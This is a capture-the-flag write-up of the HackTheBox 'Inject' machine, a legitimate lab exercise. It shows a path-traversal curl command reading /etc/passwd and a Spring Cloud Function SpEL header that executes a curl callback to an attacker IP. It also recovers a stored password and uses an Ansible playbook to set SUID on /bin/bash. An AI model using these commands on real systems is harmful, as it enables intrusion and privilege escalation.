# HackTheBox - Inject
## NMAP

```
Nmap scan report for 10.10.11.204
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Scanning the machine, we have two ports out which port 8080 is interesting to us as there's a web server running 

## PORT 8080

<img src="https://i.imgur.com/7MuE1oR.png"/>

There's an option for login and signup but login doesn't take you anywhere so visting signup page

<img src="https://i.imgur.com/LyRBKff.png"/>

There is however an option to upload files on the home page

<img src="https://i.imgur.com/tsess8E.png"/>

<img src="https://i.imgur.com/Ttxcowc.png"/>

On trying to upload file normal txt file, it only shows that image file can be uploaded

<img src="https://i.imgur.com/G7qThvN.png"/>

## Foothold 

I got exahausted for trying to upload php files but it didn't work and it was a huge rabbit hole for me but if we notice how it's fetching the uploaded files

<img src="https://i.imgur.com/FTOWXas.png"/>

It's using a GET parameter for fetching the files, trying for LFI, it didn't showed any results on the browser but if we send a request from `curl` it will show that it's indeed vulnerable

<img src="https://i.imgur.com/o0R9nMm.png"/>

```
curl 'http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd'
```

<img src="https://i.imgur.com/T82GrgP.png"/>

We can also see what files are there in the web root's directory by just traversing upto that path

```
curl 'http://10.10.11.204:8080/show_image?img=../../../'
```

<img src="https://i.imgur.com/bMyV4xC.png"/>

We can read `pom.xml` file which tells about the infromation of the project 

<img src="https://i.imgur.com/yrkKrZx.png"/>

<img src="https://i.imgur.com/mRVCfFu.png"/>

Here we can find `Spring Framework cloud` version `3.2.2` being used, on searching for vulnerabilities, spring cloud function is vulnerable to remote code execution by `spring.cloud.function.routing-expression` paramter and SpEL (Spring Expression Language) to execute system commands on the machine

```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.21")' --data-raw 'data'
```

<img src="https://i.imgur.com/TLcVmJT.png"/>

To get a reverse shell, we can add our payload in a shell script, upload it and execute it on the server

<img src="https://i.imgur.com/EEELcOp.png"/>
<img src="https://i.imgur.com/2XKX8px.png"/>

<img src="https://i.imgur.com/xdsCCVz.png"/>

<img src="https://i.imgur.com/nWDyOMR.png"/>

Stabilizing the shell with python

<img src="https://i.imgur.com/pCyTW8u.png"/>

## Privilege Escalation (Phil)

We can escalate to phil user by getting his password from `.m2` directory in `settings.xml` file

<img src="https://i.imgur.com/yjwm7PA.png"/>

Checking in what groups this user is in

<img src="https://i.imgur.com/A6zxqiv.png"/>

With `find` we can look for files or folders on which this group has access

<img src="https://i.imgur.com/4vjSw29.png"/>

Running `pspy` we can run see `ansible-playbook` being ran as root user and executing the yaml file

<img src="https://i.imgur.com/NOpyWaj.png"/>

## Privilege Escalation (root)

We can escalate our privileges to root by `shell` paramter in our ansible yaml file to execute commands as root user `/opt/automation/tasks`

```bash
echo '[{hosts: localhost, tasks: [shell: 'chmod +s /bin/bash' ]}]' > playbook_2.yml
```

<img src="https://i.imgur.com/mMRRKia.png"/>

With `chmod +s /bin/bash` we can make bash a SUID meaning it will be executed as root on running it with `-p`

<img src="https://i.imgur.com/0xWIys3.png"/>



## References

- https://github.com/me2nuk/CVE-2022-22963
- https://docs.ansible.com/ansible/2.9/modules/shell_module.html

